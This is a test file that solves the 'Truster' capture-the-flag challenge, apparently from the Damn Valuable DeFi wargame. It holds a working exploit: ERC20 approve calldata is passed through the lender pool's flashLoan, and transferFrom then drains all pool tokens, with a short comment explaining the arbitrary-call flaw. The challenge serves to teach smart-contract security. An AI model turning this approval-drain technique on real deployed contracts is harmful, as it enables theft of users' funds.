const { ethers } = require('hardhat');
const { ethers: ethers2 } = require('ethers')
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const ABI = ["function approve(address spender, uint256 amount)"];
        const interface = new ethers.utils.Interface(ABI);
        const calldata = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
        
        await pool.connect(player).flashLoan(0, player.address, token.address, calldata);
        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);

        /*
        Explanation:
        The flash loan pool calls any arbitrary target contract with any call data.
        So we just tell it to call the DVT contract and approve our attacker to move its tokens.
        Then we move the tokens later.
        */
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

